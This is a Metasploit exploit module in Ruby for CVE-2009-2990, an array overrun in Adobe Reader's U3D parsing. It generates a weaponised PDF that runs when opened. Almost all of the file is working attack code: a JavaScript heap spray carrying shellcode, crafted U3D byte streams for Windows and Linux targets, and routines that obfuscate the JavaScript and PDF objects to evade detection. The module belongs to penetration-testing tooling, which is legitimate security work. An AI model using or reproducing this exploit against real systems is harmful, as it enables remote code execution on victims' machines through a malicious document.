###
## This file is part of the Metasploit Framework and may be subject to
## redistribution and commercial restrictions. Please see the Metasploit
## Framework web site for more information on licensing and terms of use.
## http://metasploit.com/framework/
###

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe U3D CLODProgressiveMeshDeclaration Array Overrun',
			'Description'    => %q{
					This module exploits an array overflow in Adobe Reader and Adobe Acrobat.
					Affected versions include < 7.1.4, < 8.1.7, and < 9.2. By creating a 
					specially crafted pdf that a contains malformed U3D data, an attacker may 
					be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Felipe Andres Manzano <felipe.andres.manzano[at]gmail.com>',
					'jduck'
				],
			'Version'        => '$Revision: 7580 $',
			'References'     =>
				[
					[ 'CVE', '2009-2990' ],
					[ 'OSVDB', '58920' ],
					[ 'BID', '36665' ],
					[ 'URL', 'http://sites.google.com/site/felipeandresmanzano/' ],
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb09-15.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'	 => true
				},
			'Targets'        =>
				[
					# test results (on Windows XP SP3)
					# reader 7.0.5 - untested
					# reader 7.0.8 - untested
					# reader 7.0.9 - untested
					# reader 7.1.0 - untested
					# reader 7.1.1 - untested
					# reader 8.0.0 - untested
					# reader 8.1.2 - untested
					# reader 8.1.3 - untested
					# reader 9.0.0 - untested
					# reader 9.1.0 - works
					[ 'Adobe Reader Windows Universal (JS Heap Spray)',
						{
							'Index'		=> 0x01d10000,
							'Platform'	=> 'win',
							'Arch'		=> ARCH_X86,
							'escA'		=> 0x0f0f0f0f,
							'escB'		=> 0x16161616,
							'escC'		=> 0x1c1c1c1c
						}
					],
					
					# untested
					[ 'Adobe Reader Linux Universal (JS Heap Spray)',
						{
							'Index'		=> 0xfffffe3c,
							'Platform'	=> 'linux',
							'Arch'		=> ARCH_X86,
							'escA'		=> 0x75797959,
							'escB'		=> 0xa2a2a2a2,
							'escC'		=> 0x9c9c9c9c
						}
					]
				],
			'DisclosureDate' => 'Oct 13 2009',
			'DefaultTarget'  => 0))
		
		register_options(
		 	[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
			], self.class)
		
	end
	
	
	
	def exploit 
		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Make some nops
		nops    = Rex::Text.to_unescape(make_nops(4))
		
		# prepare the pointers!
		ptrA = Rex::Text.to_unescape([target['escA']].pack('V'), Rex::Arch.endian(target.arch))
		ptrB = Rex::Text.to_unescape([target['escB']].pack('V'), Rex::Arch.endian(target.arch))
		ptrC = Rex::Text.to_unescape([target['escC']].pack('V'), Rex::Arch.endian(target.arch))
		
		script = %Q| 
    var nop = unescape("#{nops}");

    function mkSlice(str,size,rest){
        while (str.length <= size/2) 
            str += str;
        str = str.substring(0, size/2 -32/2 -4/2 - rest -2/2);
        return str;
    };

    function spray(escA,escB,escC,escShellcode){
        var i;
        var pointersA = unescape(escA);
        var pointersB = unescape(escB);
        var pointersC = unescape(escC);
        var shellcode = unescape(escShellcode);

        pointersA_slide=mkSlice(pointersA,0x100000, pointersA.length);
        pointersB_slide=mkSlice(pointersB,0x100000, pointersB.length);
        pointersC_slide=mkSlice(pointersC,0x100000, pointersC.length);
        nop_slide = mkSlice(nop,0x100000, shellcode.length);
        var x = new Array();       
        for (i = 0; i < 400; i++) { 
                if(i<100)
                    x[i] = pointersA_slide+pointersA;
                else if(i<200)
                    x[i] = pointersB_slide+pointersB;
                else if(i<300)
                    x[i] = pointersC_slide+pointersC;
                else
                    x[i] = nop_slide+shellcode;
            }
       return x;
    };
    var mem;
	 mem = spray("#{ptrA}","#{ptrB}","#{ptrC}","#{shellcode}")
|

		# Obfuscate it up a bit
		script = obfuscate_js(script,
			'Symbols' => {
				'Variables' => %W{ pointersA_slide pointersA escA pointersB_slide pointersB escB pointersC_slide pointersC escC escShellcode nop_slide shellcode mem str size rest nop },
				'Methods' => %W{ mkSlice spray }
			}).to_s
		
		# create the u3d stuff
		u3d = make_u3d_stream(target['Index'])
		
		# Create the pdf
		pdf = make_pdf(script, u3d)
		
		print_status("Creating '#{datastore['FILENAME']}' file...") 

		file_create(pdf)
	end
	
	
	def obfuscate_js(javascript, opts)
		js = Rex::Exploitation::ObfuscateJS.new(javascript, opts)
		js.obfuscate
		return js
	end
	
	
	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end
	
	def ioDef(id)
		"%d 0 obj\n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end
	
	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end
	
	def make_u3d_stream(index)
		
		data = "U3D\x00"
		data << "\x18\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
		data << "\x00\x00\x00\x00\x24\x00\x00\x00\x80\xb6\x02\x00\x00\x00\x00\x00"
		data << "\x6a\x00\x00\x00\x14\xff\xff\xff\xa0\x00\x00\x00\x00\x00\x00\x00"
		data << "\x0b\x00"
		data << "E" * 11
		data << "\x01\x00\x00"
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x31\xff\xff\xff"
		data << "\x75\x00\x00\x00\x00\x00\x00\x00"
		data << "\x0b\x00"
		data << "E" * 11
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x22\xc3\x00"
		data << "\x00\x26\x62\x00\x00\x66\x49\x02\x00\x00\x00\x00\x00\x00\x00\x00"
		data << "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x26\x62\x00\x00\x2c\x01\x00"
		data << "\x00\x2c\x01\x00\x00\x2c\x01\x00\x00\x6c\x1e\x0b\x3f\xa6\x05\x6f"
		data << "\x3b\xa6\x05\x6f\x3b\x4a\xf5\x2d\x3c\x4a\xf5\x2d\x3c\x66\x66\x66"
		data << "\x3f\x00\x00\x00\x3f\xf6\x28\x7c\x3f\x00\x00\x00\x00\x00\x00\x00"
		data << "\x3c\xff\xff\xff\xf6\x00\x00\x00\x00\x00\x00\x00\x0b\x00"
		data << "E" * 11
		data << "\x00\x00\x00\x00\x00\x00\x00"
		data << "\x00\x00\x10\x00\x00"
		data << [index].pack('V')
		data << "\x00\x00\x00\x00\x00\x00\x00"
		data << "\x00\x00\x00\x07\x9c\x00\x00\x00\x37\x0c\x00\x00\xd0\x02\x00\x00"
		data << "\x3f\xeb\x95\x0d\x00\x00\x76\x05\x00\x00\xea\x15\x00\x00\xe2\x02"
		data << "\x00\x00\x00\x00\x00\x00\x80\x82\x22\x8e\x2f\xaa\x00\x00\x00\xc2"
		data << "\x13\x23\x00\x20\xbb\x06\x00\x80\xc2\x1f\x00\x80\x20\x00\x00\x00"
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xc0\x14\x01"
		data << "\x00\x20\x44\x0a\x00\x10\x7e\x4b\x8d\xf8\x7c\x32\x6d\x03\x00\x00"
		data << "\xb2\x0b\x00\x20\xfd\x19\x00\x20\xb6\xe9\xea\x2e\x55\x00\x00\x59"
		data << "\x94\x00\x00\x4c\x00\x01\x00\x1a\xbb\xa0\xc8\xc1\x04\x00\x70\xc4"
		data << "\xa0\x00\x00\x00\x6c\x98\x46\xac\x04\x00\x60\xf6\x1c\x00\x20\xa1"
		data << "\x0f\x00\xa0\x17\x66\x23\x00\x00\xde\x88\x1d\x00\x00\x7b\x16\x9f"
		data << "\x72\x9a\x1d\x15\x00\x80\xeb\x39\x00\x00\x00\x00\x00\x00\x94\xc8"
		data << "\x00\x00\x54\xce\xfb\x32\x00\x80\xc4\x3e\xb0\xc4\x88\xde\x77\x00"
		data << "\x00\x46\x72\x01\x00\xf0\x56\x01\x00\x8c\x53\xe9\x10\x9d\x6b\x06"
		data << "\x00\x50\xa2\x00"

		#laziest hack ever! Another index must be found for using the following 
		# stream in windows.. and a lot of tests shoul be done.
		if index == 0x01d10000
			return data
		end
		
		# linux version
		data = "U3D\x00"
		data << "\x18\x00\x00\x00\x16\x04\x00\x00\x00\x01\x00\x00"
		data << "\x00\x00\x00\x00\x24\x00\x00\x00\x74\x01\x00\x00\x00\x00\x00\x00"
		data << "\x6a\x00\x00\x00\x01\x00\x00\x00\x08\x00\x61\x6c\x61\x6c\x61\x6c"
		data << "\x61\x30\x01\x00\x00\x00\x00\x04\x00\x00"
		data << "\xa8" * 1024
		data << "\x50\x50\x14\xff\xff\xff"
		data << "\xa0\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x41\x41\x41\x41\x41\x41"
		data << "\x41\x41\x41\x41\x41\x01\x00\x00\x00\x00\x00\x00\x00\x50\x50\x50"
		data << "\x01\x00\x00\x00\x31\xff\xff\xff\x75\x00\x00\x00\x00\x00\x00\x00"
		data << "\x0b\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00"
		data << "\x00\x00\x00\x00\x00\x22\xc3\x00\x00\x26\x66\x00\x00\x04\x00\x00"
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x00\x00"
		data << "\x00\x65\x00\x00\x00\x2c\x01\x00\x00\x2c\x01\x00\x00\x2c\x01\x00"
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		data << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		data << "\x00\x00\x00\x00\x00\x50\x50\x50\x3c\xff\xff\xff\x95\x00\x00\x00"
		data << "\x00\x00\x00\x00\x0b\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
		data << "\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
		data << [index].pack('V')
		data << "\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00"
		data << "\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00"
		data << "\x00\x01\x00\x00\x00\x01\x00\x00\x00\x46\x65\x6c\x69\x46\x65\x6c"
		data << "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
		data << "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
		data << "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
		data << "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x46\x65\x6c"
		data << "\x69\x46\x65\x6c\x69\x46\x65\x6c\x69\x50\x50\x50"
		return data
		
	end
	
	def make_pdf(js, u3d_stream)
		
		xref = []
		eol = "\x0a"
		obj_end = "" << eol << "endobj" << eol
		
		# the header
		pdf = "%PDF-1.7" << eol
		
		# filename/comment
		pdf << "%" << RandomNonASCIIString(4) << eol
		
		# js stream
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(1) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << obj_end
		
		# catalog
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Catalog/Outlines ") << ioRef(4) << nObfu("/Pages ") << ioRef(5) << nObfu("/OpenAction ") << ioRef(9) << nObfu(">>")
		pdf << obj_end
		
		# outline
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Outlines/Count 0>>")
		pdf << obj_end
		
		# kids
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Pages/Count 1/Kids [")
		pdf << ioRef(8) # u3d page
		pdf << nObfu("]>>")
		pdf << obj_end
		
		# u3d stream
		xref << pdf.length
		pdf << ioDef(6) << nObfu("<</Type/3D/Subtype/U3D/Length %s>>" % u3d_stream.length) << eol
		pdf << "stream" << eol
		pdf << u3d_stream << eol
		pdf << "endstream"
		pdf << obj_end
		
		# u3d annotation object
		xref << pdf.length
		pdf << ioDef(7) << nObfu("<</Type/Annot/Subtype")
		pdf << "/3D/3DA <</A/PO/DIS/I>>"
		pdf << nObfu("/Rect [0 0 640 480]/3DD ") << ioRef(6) << nObfu("/F 7>>")
		pdf << obj_end
		
		# page 0 (u3d)
		xref << pdf.length
		pdf << ioDef(8) << nObfu("<</Type/Page/Parent ") << ioRef(5) << nObfu("/MediaBox [0 0 640 480]")
		pdf << nObfu("/Annots [") << ioRef(7) << nObfu("]")
		pdf << nObfu(">>")
		pdf << obj_end

		# js dict
		xref << pdf.length
		pdf << ioDef(9) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(1) + ">>" << obj_end
		
		# xrefs
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		
		# trailer
		pdf << "trailer" << eol
		pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(3) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end

end
